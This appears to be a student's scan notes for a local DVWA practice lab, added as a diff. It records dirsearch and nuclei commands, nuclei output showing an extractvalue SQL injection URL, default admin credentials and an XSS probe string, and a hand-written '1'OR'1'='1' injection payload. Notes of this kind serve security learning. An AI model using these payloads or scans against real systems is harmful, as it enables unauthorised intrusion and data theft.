@@ -1,0 +1,132 @@
+dirsearch
+cd dirsearch
+python3 dirsearch.py -u https://example.com -e php,html,js
+
+nuclei
+sqli
+
+nuclei -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  -H "Cookie: PHPSESSID=6c7b8b4a057b61ba87813cd859b8059b; security=low" \
+  -tags sqli \
+  -severity critical
+
+
+PHPSESSID:""
+
+
+
+
+
+
+Ket qua: 
+[INF] Current nuclei version: v3.8.0 (latest)
+[INF] Current nuclei-templates version: v10.4.4 (latest)
+[INF] New templates added in latest release: 179
+[INF] Templates loaded for current scan: 338
+[INF] Executing 338 signed templates from projectdiscovery/nuclei-templates
+[INF] Targets loaded for current scan: 1
+[INF] Using Interactsh Server: oast.me
+[yeswiki-sql] [http] [critical] http://localhost:4280/vulnerabilities/sqli/?id=1&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5(999999999),1,user()))))--+-&Submit=Submit&PagePrincipale/rss
+[INF] Scan completed in 27.916695849s. 1 matches found.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+SQLI: 1'OR'1'='1
+
+loi trang home sau khi quet nuclei
+
+[INF] Current nuclei version: v3.8.0 (latest)
+[INF] Current nuclei-templates version: v10.4.3 (latest)
+[INF] New templates added in latest release: 103
+[INF] Templates loaded for current scan: 10194
+[INF] Executing 10178 signed templates from projectdiscovery/nuclei-templates
+[WRN] Loading 16 unsigned templates for scan. Use with caution.
+[INF] Targets loaded for current scan: 1
+[INF] Templates clustered: 2292 (Reduced 2162 Requests)
+[INF] Using Interactsh Server: oast.me
+[dvwa-default-login] [http] [critical] http://localhost:4280/index.php [password="password",username="admin"]
+
+[cookies-without-secure] [javascript] [info] localhost:4280 ["security","PHPSESSID"]
+khong duoc bao mat cookie, gui qua http, https
+
+[waf-detect:apachegeneric] [http] [info] http://localhost:4280/
+
+[snmpv3-detect] [javascript] [info] localhost:4280 ["Enterprise: unknown"]
+
+[fingerprinthub-web-fingerprints:dvwa] [http] [info] http://localhost:4280/login.php
+
+[tech-detect:php] [http] [info] http://localhost:4280/login.php
+[tech-detect:php] [http] [info] http://localhost:4280/
+
+[readme-md] [http] [info] http://localhost:4280/README.md
+
+[http-missing-security-headers:missing-content-type] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:content-security-policy] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:x-frame-options] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:referrer-policy] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:strict-transport-security] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:permissions-policy] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:x-content-type-options] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:clear-site-data] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://localhost:4280/login.php
+[INF] Skipped localhost:4040 from target list as found unresponsive permanently: cause="port closed or filtered" address=localhost:4040 chain="connection refused; got err while executing https://localhost:4040/jobs/?\"'><script>alert(document.domain)</script>"
+[robots-txt] [http] [info] http://localhost:4280/robots.txt
+[INF] Skipped [localhost:4280]:5814 from target list as found unresponsive permanently: Get "https://localhost:4280:5814/autopass": cause="no address found for host"
+[INF] Skipped localhost:4280 from target list as found unresponsive permanently: cause="no address found for host" chain="got err while executing https://localhost:4280:5814/autopass"
+[robots-txt-endpoint] [http] [info] http://localhost:4280/robots.txt
+[caa-fingerprint] [dns] [info] localhost
+[INF] Scan completed in 2m. 23 matches found.
+
+
+
+
+
+
+Loi o trang SQLi sau khi quet nuclei 
+[INF] Current nuclei version: v3.8.0 (latest)
+[INF] Current nuclei-templates version: v10.4.3 (latest)
+[INF] New templates added in latest release: 103
+[INF] Templates loaded for current scan: 10194
+[INF] Executing 10178 signed templates from projectdiscovery/nuclei-templates
+[WRN] Loading 16 unsigned templates for scan. Use with caution.
+[INF] Targets loaded for current scan: 1
+^[[B^[[B^[[B^[[B^[[B^[[B[INF] Templates clustered: 2292 (Reduced 2162 Requests)
+^[[B^[[B^[[B[INF] Using Interactsh Server: oast.online
+[cookies-without-secure] [javascript] [info] localhost:4280 ["security","PHPSESSID"]
+[waf-detect:apachegeneric] [http] [info] http://localhost:4280/vulnerabilities/sqli/
+[snmpv3-detect] [javascript] [info] localhost:4280 ["Enterprise: unknown"]
+[fingerprinthub-web-fingerprints:dvwa] [http] [info] http://localhost:4280/login.php
+[tech-detect:php] [http] [info] http://localhost:4280/login.php
+[tech-detect:php] [http] [info] http://localhost:4280/vulnerabilities/sqli/
+[INF] Skipped [localhost:4280]:5814 from target list as found unresponsive permanently: Get "https://localhost:4280:5814/autopass": cause="no address found for host"
+[INF] Skipped localhost:4280 from target list as found unresponsive permanently: cause="no address found for host" chain="got err while executing https://localhost:4280:5814/autopass"
+[INF] Skipped localhost:4040 from target list as found unresponsive permanently: cause="port closed or filtered" address=localhost:4040 chain="connection refused; got err while executing https://localhost:4040/jobs/?\"'><script>alert(document.domain)</script>"
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:content-security-policy] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:permissions-policy] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:referrer-policy] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:clear-site-data] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:missing-content-type] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:strict-transport-security] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:x-frame-options] [http] [info] http://localhost:4280/login.php
+[http-missing-security-headers:x-content-type-options] [http] [info] http://localhost:4280/login.php
+[INF] Skipped localhost:4280 from target list as found unresponsive permanently: cause="no address found for host" chain="got err while executing https://www.rdap.net/domain/localhost"
+[INF] Scan completed in 2m. 18 matches found.
